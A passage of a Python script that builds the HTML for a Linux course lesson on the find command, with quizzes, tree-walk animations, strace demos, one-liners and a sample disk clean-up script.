    dict(cmd='find . -name x -exec echo {}', meaning='-exec needs \\; or + at the end.', fix='<code>-exec echo {} \\;</code> or <code>+</code>.'),
    dict(cmd='find -name x /tmp', meaning='Paths must come before the tests.', fix='<code>find /tmp -name x</code>.'),
    dict(cmd="find . -mtime 1.5x", meaning='A number with letters is not valid.', fix='Whole numbers with + or -; use -mmin for minutes.'),
]) + qc('Write a command that deletes .tmp files older than 7 days under /tmp/app, after you have checked the list.', "<code>find /tmp/app -name '*.tmp' -type f -mtime +7</code> (check), then the same with <code>-delete</code> at the end.") + '''
'''

SCREENS = screens_block('Real terminal screens: find with errors and with sudo', 'A normal user searching /etc sees errors mixed with results; hiding stderr leaves clean results.',
    "printf '%s\\n' 'PS1=\"riya@laptop:~$ \"' > ~/.mprc", 'bash --rcfile ~/.mprc', [
    ("Enter", "\"find /etc -name 'sudoers*'\" Enter", ' after <code>find /etc -name \'sudoers*\'</code>: results and “Permission denied” lines together.'),
    ("Enter", "C-l \"find /etc -name 'sudoers*' 2>/dev/null\" Enter", ' after the same command with <code>2&gt;/dev/null</code>: only the results (Lesson 5.2).'),
], 72, 10, hid='screens', what='bash and find')

cards = cards + SCREENS + '</section>\n'

# ---------------------------------------------------------------- 5. animations
NODES = [('proj', 0), ('backup', 1), ('db_2026-10-01.sql.gz', 2), ('logs', 1), ('app.log  3M', 2), ('cron.log', 2), ('src', 1), ('main.py', 2)]
def walk(k, hits, note, tone):
    o = ''
    for i, (n, d) in enumerate(NODES):
        tn = 'amber' if i == k else ('green' if i in hits and i < k else 'card')
        o += label_box(14 + d * 26, 6 + i * 19, 190, 17, [n], tn, 7.2)
    res = [NODES[i][0] for i in hits if i <= k]
    o += label_box(236, 20, 114, 110, ['matches'] + res, 'blue', 7)
    return o + t(180, 172, note, 8.4, tone, bold=True)
frames = [walk(0, [2, 4], 'Start at proj: test it, then open it.', 'violet'),
          walk(2, [2, 4], 'backup/db_…gz: +1M? yes (1M rounded… no). Old? yes.', 'green'),
          walk(4, [2, 4], 'logs/app.log: bigger than 1M → match.', 'green'),
          walk(7, [2, 4], 'src/main.py: small, recent → no.', 'amber')]
frames = [walk(0, [4], 'Start at proj: test it, then open it.', 'violet'), walk(2, [4], 'backup/db…gz: exactly 1M, not more than 1M → no.', 'amber'),
          walk(4, [4], 'logs/app.log: 3M, bigger than 1M → match.', 'green'), walk(7, [4], 'src/main.py: tiny → no. The walk ends.', 'violet')]
s1 = anim_one('Animated example', "find proj -type f -size +1M",
              'find visits every entry under the starting point, depth first, and tests each one.',
              'Walking the tree', 'A folder tree; a highlight moves from proj through backup, logs and src; matching files are copied to a results box.', frames,
              ['find starts at the path you give.', 'Each entry is tested; folders are entered.', 'A match is printed at once.', 'Every branch is visited unless pruned.'], hid='scenario-walk')

def ino(k, note, tone):
    rows = [('name', 'app.log'), ('size', '3 MiB'), ('mtime', '2026-11-06 09:59'), ('owner', 'riya'), ('mode', 'rw-r--r--')]
    o = label_box(14, 10, 150, 24, ['folder entry: app.log'], 'card', 8)
    o += label_box(190, 10, 156, 120, ['inode (file data)'] + ['%s: %s' % r for r in rows], 'amber' if k else 'card', 7.6)
    o += label_box(14, 50, 150, 80, ['file contents', '(3 MiB of bytes)', 'NOT read'], 'card', 7.8)
    o += arrow(166, 22, 186, 22)
    tests = ['', '-name: from the folder entry', '-size +1M: 3 MiB > 1 MiB ✓', '-mtime -1: changed today ✓']
    if tests[k]:
        o += label_box(40, 140, 280, 22, [tests[k]], 'green', 8)
    return o + t(180, 186, note, 8.4, tone, bold=True)
see2 = [term(14, 16, 332, 116, ["$ find proj/logs -name 'app.log' -size +1M -mtime -1", ('proj/logs/app.log', 'acc')], title='riya@laptop', size=7.4) + cap(c, '', 'card', y=150, h=34)
        for c in ['You type one line…', '…find checks the name…', '…then the size…', '…then the time: a match.']]
behind2 = [ino(0, 'find lists the folder: names only.', 'violet'), ino(1, 'The name test needs nothing else.', 'blue'),
           ino(2, 'Size comes from the inode (stat), not the contents.', 'amber'), ino(3, 'Time too. The 3 MiB of data are never read.', 'green')]
two = anim_two('What find really looks at', 'Behind the screen: folder entries and inodes',
               'A terminal: find with -name, -size and -mtime prints proj/logs/app.log.',
               'A folder entry pointing to an inode with name, size, mtime, owner and mode; the file contents box is marked not read; each test lights up its field.', see2, behind2,
               ['One command with three tests.', 'Test 1: the name.', 'Test 2: the size.', 'Test 3: the time. Printed.'],
               ['The folder gives the names.', '-name is checked first (cheap).', 'stat() reads size, times, owner from the inode.', 'Contents are never opened: that is why find is fast.'])

dx = dissect("Layer by layer: find proj -name '*.log' -mtime +7 -exec gzip {} \\;",
    'How one find command line is understood. Each layer has a real command and output from our build machine.', [
    dict(key='shell', name='The shell', sub='quotes and \\;',
         why='The shell must not touch * or ;.',
         how='Quotes keep *.log as text; \\; passes ; to find.',
         impl='find receives the words exactly.', used='Every find.',
         cmd="printf '[%s] ' find proj -name '*.log' -mtime +7 -exec gzip {} \\;; echo"),
    dict(key='walk', name='Walk', sub='every entry',
         why='Visit the whole tree.',
         how='getdents64 lists folders; newfstatat reads each entry’s data.',
         impl='Depth first.', used='All searches.',
         setup=TREE, cmd='find proj | wc -l'),
    dict(key='tests', name='Tests', sub='left to right, stop at false',
         why='Fast: cheap tests first.',
         how='-name, then -mtime only if the name matched.',
         impl='Short-circuit AND.', used='Performance.',
         setup=TREE, cmd="find proj -name '*.log' -mtime +7"),
    dict(key='act', name='Action', sub='-exec gzip {} \\;',
         why='Do the work.',
         how='{} replaced by the path; one gzip per file.',
         impl='fork + exec per file (+ batches).', used='Bulk changes.',
         setup=TREE, cmd="find proj -name '*.log' -mtime +7 -exec gzip {} \\;; ls proj/logs"),
], hint='From the command line to gzipped logs. Click a layer.')

HOOD = hood('Under the hood: find reads folders, not files', 'strace shows find listing folders with <code>getdents64</code> and checking entries; it never reads the 3 MB log’s contents.',
    "find proj/logs -size +1M", setup=TREE, show='openat.*proj|getdents64|newfstatat.*app\\.log|^write\\(1', start='openat.*proj')

animation = '''<section class="part" id="animation">
  <span class="part-label"><b>5</b> See it happen</span>
  <h2>find walking the tree</h2>
''' + s1 + two + dx + HOOD + qc('Why is <code>find / -size +1G</code> much faster than <code>grep -r something /</code>?', 'find only reads folder listings and file metadata; grep must read the contents of every file.') + '''
</section>
'''

# ---------------------------------------------------------------- 6. real world
uc = '''<section class="part" id="real-world">
  <span class="part-label"><b>6</b> Real-world use</span>
  <h2>find at work</h2>
''' + usecase(term(8, 14, 104, 62, [('$ find / -xdev', 'prompt'), ('-size +1G', 'acc')], title='ops', size=6.4, step=12),
              '1. Disk full', 'The first command when a disk fills: what is big, what is old, what can go.', ['Alert', '*find -size', 'space']) + '\n' + usecase(
    label_box(14, 22, 92, 46, ['-mtime +30', '-delete'], 'blue', 8.6), '2. Retention and clean-up',
    'Cron jobs delete backups, temp files and old logs by age with find.', ['Nightly', '*find -mtime', 'clean disk']) + '\n' + usecase(
    label_box(14, 22, 92, 46, ['-perm -4000', '-nouser'], 'red', 8.6), '3. Security audits',
    'SUID files, world-writable files, orphaned files and recent changes are found with find.', ['Audit', '*find -perm', 'findings']) + '\n' + usecase(
    label_box(14, 22, 92, 46, ['-exec chmod', '{} +'], 'green', 8.6), '4. Bulk changes',
    'Fix permissions, convert, compress or move thousands of files in one command.', ['Files', '*-exec', 'changed']) + '\n' + usecase(
    label_box(14, 22, 92, 46, ['-newer', 'marker'], 'violet', 8.6), '5. Incremental work',
    'Back up or sync only what changed since the last run.', ['Marker', '*-newer', 'delta']) + '''
  <p class="muted">Examples are simplified and generic. They describe common patterns, not the internal systems of any particular company.</p>
''' + oneliners('Small, useful commands from your notes and practice. All really run on our build machine.', [
    dict(level='b', title='Folders only (from your notes)', scenario='List directories under a path.', setup=TREE,
         cmd="find proj -type d | sort | head -4", explain='-type d.'),
    dict(level='b', title='Empty folders (from your notes)', scenario='Which folders are empty?', setup=TREE,
         cmd="find proj -type d -empty", explain='-empty with -type d.'),
    dict(level='i', title='.txt changed in the last day (from your notes)', scenario='Recent text files.', setup=TREE + "\ntouch proj/notes.txt",
         cmd="find proj -type f -name '*.txt' -mtime -1", explain='Name and time together = AND.'),
    dict(level='i', title='Count files per extension', scenario='What is in this project?', setup=TREE,
         cmd="find proj -type f -name '*.*' | sed 's/.*\\.//' | sort | uniq -c | sort -rn | head -4", explain='find + sed + the frequency pipeline (Lesson 6.2).'),
    dict(level='a', title='Total size of old backups', scenario='How much would deleting them free?', setup=TREE,
         cmd="find proj/backup -name '*.gz' -mtime +30 -printf '%s\\n' | paste -sd+ | bc", explain='-printf %s + paste + bc.'),
], extra=build_up('the disk clean-up', 'Riya frees space safely, step by step.', TREE, [
    ("find proj -type f -size +500k -printf '%s %p\\n' | sort -rn", '1. What is big?'),
    ("find proj -type f \\( -name '*.tmp' -o -name '*.gz' \\) -mtime +30", '2. Old temp files and backups (the candidates).'),
    ("find proj -type f \\( -name '*.tmp' -o -name '*.gz' \\) -mtime +30 -printf '%s\\n' | paste -sd+ | bc", '3. How many bytes would that free?'),
    ("find proj -type f \\( -name '*.tmp' -o -name '*.gz' \\) -mtime +30 -delete; find proj -type f \\( -name '*.tmp' -o -name '*.gz' \\) | sort", '4. Delete, then check what is left.'),
])) + which('Choosing the right tool.', [
    ('Files by name, anywhere, fast', 'locate (7.2)', 'Index, instant.', 'find / every time.'),
    ('Files by size, age, owner', 'find', 'Live, exact.', 'ls -R | grep.'),
    ('Text inside files', 'grep -r', 'Reads contents.', 'find alone.'),
    ('Folder totals', 'du -sh * | sort -h', 'Per folder.', 'find for totals.'),
    ('Act on many files', 'find -exec … +', 'One command.', 'for f in $(find …).'),
    ('Odd file names', '-print0 | xargs -0', 'Safe.', 'find | xargs.'),
    ('Skip .git, node_modules', '-prune', 'Fast.', 'Filtering with grep -v later.'),
    ('Delete', 'list first, then -delete', 'Safe.', '-delete first.'),
]) + keys('Shortcuts and handy forms.', [
    ('2>/dev/null', 'hide Permission denied', "find / -name x 2>/dev/null"),
    ('-xdev', 'stay on one file system', 'find / -xdev -size +1G'),
    ("-printf '%TY-%Tm-%Td %p\\n'", 'date and path', 'find . -printf …'),
    ('-exec … {} +', 'many files per command', 'find . -exec ls -l {} +'),
    ('-ls', 'ls -l style output', 'find . -size +1M -ls'),
    ('Ctrl + C', 'stop a long search', 'find /'),
]) + scriptit('cleanup.sh', 'The clean-up as a cron-ready script: report, then delete old temp files and backups, and log how much space was freed.',
TREE + '''
dir=proj; days=30
list=$(find "$dir" -type f \\( -name '*.tmp' -o -name '*.gz' \\) -mtime +$days)
[ -z "$list" ] && { echo "nothing to delete"; exit 0; }
bytes=$(find "$dir" -type f \\( -name '*.tmp' -o -name '*.gz' \\) -mtime +$days -printf '%s\\n' | paste -sd+ | bc)
echo "deleting $(echo "$list" | wc -l) files, $bytes bytes:"; echo "$list"
find "$dir" -type f \\( -name '*.tmp' -o -name '*.gz' \\) -mtime +$days -delete
echo "$(date -d 2026-11-06 +%F) freed $bytes bytes" >> cleanup.log; cat cleanup.log''',
'<p>The block at the top only creates the sample project. In cron: <code>0 3 * * * /opt/scripts/cleanup.sh &gt;&gt; /var/log/cleanup.log 2&gt;&amp;1</code> (Lesson 17.4).</p>') + puzzle_answer('Without quotes the shell expands <code>*.py</code> in the current folder (src/) before find runs. There it matches only <code>app.py</code>, so find receives <code>-name app.py</code> and finds just that name. Quote it: <code>find .. -name \'*.py\'</code>. And <code>-size -1k</code> rounds every file up to whole kilobytes: a 2-byte file counts as 1k, which is not less than 1k, so only empty files match. Use <code>-size -1024c</code>.') + qc('How do you list files larger than 10 MB in your home folder with human-readable sizes?', "<code>find ~ -type f -size +10M -exec ls -lh {} +</code>") + '''
</section>
'''

body = (HOOK + ROAD + cmap + story.replace('  <div class="story">', before('<a href="../../03-files-and-directories/04-wildcards-and-globbing/">Lesson 3.4</a> (wildcards) and <a href="../../05-redirection-and-pipes/04-chaining-commands-exit-codes-and-xargs/">5.4</a> (xargs).') + '  <div class="story">', 1)
        + '<section class="part part--decide">' + DECIDE + '</section>\n' + definition + types + cards + animation + uc)
open(os.path.join(HERE, 'body.html'), 'w', encoding='utf-8').write(body)
print('body.html', len(body) // 1024, 'KB')
